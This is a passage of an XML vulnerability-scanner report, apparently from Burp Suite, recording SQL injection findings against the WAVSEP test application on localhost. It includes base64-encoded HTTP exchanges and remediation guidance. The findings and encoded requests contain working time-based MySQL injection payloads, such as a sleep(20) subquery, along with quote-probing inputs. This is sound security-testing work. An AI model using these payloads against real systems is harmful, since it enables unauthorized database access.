XRlPTIwMTAtMDItMDIn]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpDb250ZW50LUxlbmd0aDogNTMzDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjUzOjM5IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMTQgLSBJbmplY3Rpb24gaW50byBkYXRlIHZhbHVlcyBpbiBhbiB1cGRhdGUgcGFnZSB3aXRoIGVycm9uZW91cyByZXNwb25zZXM8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgoKRXhjZXB0aW9uIGRldGFpbHM6IGphdmEuc3FsLlNRTFN5bnRheEVycm9yRXhjZXB0aW9uOiBZb3UgaGF2ZSBhbiBlcnJvciBpbiB5b3VyIFNRTCBzeW50YXg7IGNoZWNrIHRoZSBtYW51YWwgdGhhdCBjb3JyZXNwb25kcyB0byB5b3VyIE15U1FMIHNlcnZlciB2ZXJzaW9uIGZvciB0aGUgcmlnaHQgc3ludGF4IHRvIHVzZSBuZWFyICcnMjAxMC0wMi0wMicnJyBhdCBsaW5lIDEKCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBFcnJvci9DYXNlMTQtSW5qZWN0aW9uSW5VcGRhdGUtRGF0ZS1Db21tYW5kSW5qZWN0aW9uLVdpdGgyMDBFcnJvcnMuanNwIEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQNCkNvbnRlbnQtTGVuZ3RoOiAyNg0KT3JpZ2luOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwDQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLVBPU1QtMjAwRXJyb3IvQ2FzZTE0LUluamVjdGlvbkluVXBkYXRlLURhdGUtQ29tbWFuZEluamVjdGlvbi1XaXRoMjAwRXJyb3JzLmpzcA0KQ29va2llOiBKU0VTU0lPTklEPTRFRTlBQ0Q5NkI0NTZFQ0NFOUY1MkJCQTc4MUUyRjFEDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQpTZWMtRmV0Y2gtVXNlcjogPzENCg0KdHJhbnNhY3Rpb25EYXRlPTIwMTAtMDItMDInJw==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjUzOjM5IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzMzUNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMTQgLSBJbmplY3Rpb24gaW50byBkYXRlIHZhbHVlcyBpbiBhbiB1cGRhdGUgcGFnZSB3aXRoIGVycm9uZW91cyByZXNwb25zZXM8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgoKUXVlcnkgZXhlY3V0ZWQKCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBFcnJvci9DYXNlMTQtSW5qZWN0aW9uSW5VcGRhdGUtRGF0ZS1Db21tYW5kSW5qZWN0aW9uLVdpdGgyMDBFcnJvcnMuanNwIEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQNCkNvbnRlbnQtTGVuZ3RoOiAyNg0KT3JpZ2luOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwDQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLVBPU1QtMjAwRXJyb3IvQ2FzZTE0LUluamVjdGlvbkluVXBkYXRlLURhdGUtQ29tbWFuZEluamVjdGlvbi1XaXRoMjAwRXJyb3JzLmpzcA0KQ29va2llOiBKU0VTU0lPTklEPTRFRTlBQ0Q5NkI0NTZFQ0NFOUY1MkJCQTc4MUUyRjFEDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQpTZWMtRmV0Y2gtVXNlcjogPzENCg0KdHJhbnNhY3Rpb25EYXRlPTIwMTAtMDItMDInJTIwYW5kJTIwKHNlbGVjdCpmcm9tKHNlbGVjdChzbGVlcCgyMCkpKWEpLS0lMjA=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjUzOjU5IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzMzUNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMTQgLSBJbmplY3Rpb24gaW50byBkYXRlIHZhbHVlcyBpbiBhbiB1cGRhdGUgcGFnZSB3aXRoIGVycm9uZW91cyByZXNwb25zZXM8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgoKUXVlcnkgZXhlY3V0ZWQKCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>1892837256851301376</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case01-InjectionInLogin-String-LoginBypass-WithErrors.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case01-InjectionInLogin-String-LoginBypass-WithErrors.jsp [password parameter]]]></location>
    <severity>High</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>password</b> parameter appears to be vulnerable to SQL injection attacks. A single quote was submitted in the password parameter, and a database error message was returned. Two single quotes were then submitted and the error message disappeared. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.<br><br> Additionally, the payload <b>'+(select*from(select(sleep(20)))a)+'</b> was submitted in the password parameter. The application took <b>20005</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <remediationDetail><![CDATA[The application should handle errors gracefully and prevent SQL error messages from being returned in responses. ]]></remediationDetail>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC01MDBFcnJvci9DYXNlMDEtSW5qZWN0aW9uSW5Mb2dpbi1TdHJpbmctTG9naW5CeXBhc3MtV2l0aEVycm9ycy5qc3AgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZA0KQ29udGVudC1MZW5ndGg6IDM1DQpPcmlnaW46IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODANClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC01MDBFcnJvci9DYXNlMDEtSW5qZWN0aW9uSW5Mb2dpbi1TdHJpbmctTG9naW5CeXBhc3MtV2l0aEVycm9ycy5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD00RUU5QUNEOTZCNDU2RUNDRTlGNTJCQkE3ODFFMkYxRA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KU2VjLUZldGNoLVVzZXI6ID8xDQoNCnBhc3N3b3JkPXBhc3N3b3JkJyZ1c2VybmFtZT11c2VybmFtZQ==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgNTAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpDb250ZW50LUxhbmd1YWdlOiBlbg0KQ29udGVudC1MZW5ndGg6IDkyMQ0KRGF0ZTogVHVlLCAyMyBBcHIgMjAyNCAwODo0NToyOSBHTVQNCkNvbm5lY3Rpb246IGNsb3NlDQoNCjwhZG9jdHlwZSBodG1sPjxodG1sIGxhbmc9ImVuIj48aGVhZD48dGl0bGU+SFRUUCBTdGF0dXMgNTAwID8gSW50ZXJuYWwgU2VydmVyIEVycm9yPC90aXRsZT48c3R5bGUgdHlwZT0idGV4dC9jc3MiPmJvZHkge2ZvbnQtZmFtaWx5OlRhaG9tYSxBcmlhbCxzYW5zLXNlcmlmO30gaDEsIGgyLCBoMywgYiB7Y29sb3I6d2hpdGU7YmFja2dyb3VuZC1jb2xvcjojNTI1RDc2O30gaDEge2ZvbnQtc2l6ZToyMnB4O30gaDIge2ZvbnQtc2l6ZToxNnB4O30gaDMge2ZvbnQtc2l6ZToxNHB4O30gcCB7Zm9udC1zaXplOjEycHg7fSBhIHtjb2xvcjpibGFjazt9IC5saW5lIHtoZWlnaHQ6MXB4O2JhY2tncm91bmQtY29sb3I6IzUyNUQ3Njtib3JkZXI6bm9uZTt9PC9zdHlsZT48L2hlYWQ+PGJvZHk+PGgxPkhUVFAgU3RhdHVzIDUwMCA/IEludGVybmFsIFNlcnZlciBFcnJvcjwvaDE+PGhyIGNsYXNzPSJsaW5lIiAvPjxwPjxiPlR5cGU8L2I+IFN0YXR1cyBSZXBvcnQ8L3A+PHA+PGI+TWVzc2FnZTwvYj4gRXhjZXB0aW9uIGRldGFpbHM6IGphdmEuc3FsLlNRTFN5bnRheEVycm9yRXhjZXB0aW9uOiBZb3UgaGF2ZSBhbiBlcnJvciBpbiB5b3VyIFNRTCBzeW50YXg7IGNoZWNrIHRoZSBtYW51YWwgdGhhdCBjb3JyZXNwb25kcyB0byB5b3VyIE15U1FMIHNlcnZlciB2ZXJzaW9uIGZvciB0aGUgcmlnaHQgc3ludGF4IHRvIHVzZSBuZWFyICYjMzk7JiMzOTtwYXNzd29yZCYjMzk7JiMzOTsmIzM5OyBhdCBsaW5lIDE8L3A+PHA+PGI+RGVzY3JpcHRpb248L2I+IFRoZSBzZXJ2ZXIgZW5jb3VudGVyZWQgYW4gdW5leHBlY3RlZCBjb25kaXRpb24gdGhhdCBwcmV2ZW50ZWQgaXQgZnJvbSBmdWxmaWxsaW5nIHRoZSByZXF1ZXN0LjwvcD48aHIgY2xhc3M9ImxpbmUiIC8+PGgzPkFwYWNoZSBUb21jYXQvOC41Ljg0PC9oMz48L2JvZHk+PC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC01MDBFcnJvci9DYXNlMDEtSW5qZWN0aW9uSW5Mb2dpbi1TdHJpbmctTG9naW5CeXBhc3MtV2l0aEVycm9ycy5qc3AgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZA0KQ29udGVudC1MZW5ndGg6IDM1DQpPcmlnaW46IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODANClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC01MDBFcnJvci9DYXNlMDEtSW5qZWN0aW9uSW5Mb2dpbi1TdHJpbmctTG9naW5CeXBhc3MtV2l0aEVycm9ycy5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD00RUU5QUNEOTZCNDU2RUNDRTlGNTJCQkE3ODFFMkYxRA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KU2VjLUZldGNoLVVzZXI6ID8xDQoNCnBhc3N3b3JkPXBhc3N3b3JkJycmdXNlcm5hbWU9dXNlcm5hbWU=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQ1OjI5IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzMzINCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMSAtIEluamVjdGlvbiBpbnRvIHN0cmluZyB2YWx1ZXMgaW4gYSBsb2dpbiBwYWdlIHdpdGggZXJyb25lb3VzIHJlc3BvbnNlczwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+Cgpsb2dpbiBmYWlsZWQKCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC01MDBFcnJvci9DYXNlMDEtSW5qZWN0aW9uSW5Mb2dpbi1TdHJpbmctTG9naW5CeXBhc3MtV2l0aEVycm9ycy5qc3AgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZA0KQ29udGVudC1MZW5ndGg6IDM1DQpPcmlnaW46IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODANClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC01MDBFcnJvci9DYXNlMDEtSW5qZWN0aW9uSW5Mb2dpbi1TdHJpbmctTG9naW5CeXBhc3MtV2l0aEVycm9ycy5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD00RUU5QUNEOTZCNDU2RUNDRTlGNTJCQkE3ODFFMkYxRA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KU2VjLUZldGNoLVVzZXI6ID8xDQoNCnBhc3N3b3JkPXBhc3N3b3JkJyUyYihzZWxlY3QqZnJvbShzZWxlY3Qoc2xlZXAoMjApKSlhKSUyYicmdXNlcm5hbWU9dXNlcm5hbWU=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQ1OjQ5IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzMzINCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMSAtIEluamVjdGlvbiBpbnRvIHN0cmluZyB2YWx1ZXMgaW4gYSBsb2dpbiBwYWdlIHdpdGggZXJyb25lb3VzIHJlc3BvbnNlczwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+Cgpsb2dpbiBmYWlsZWQKCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>1908306106335374336</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case01-InjectionInLogin-String-LoginBypass-WithErrors.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case01-InjectionInLogin-String-LoginBypass-WithErrors.jsp [username parameter]]]></location>
    <severity>High</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
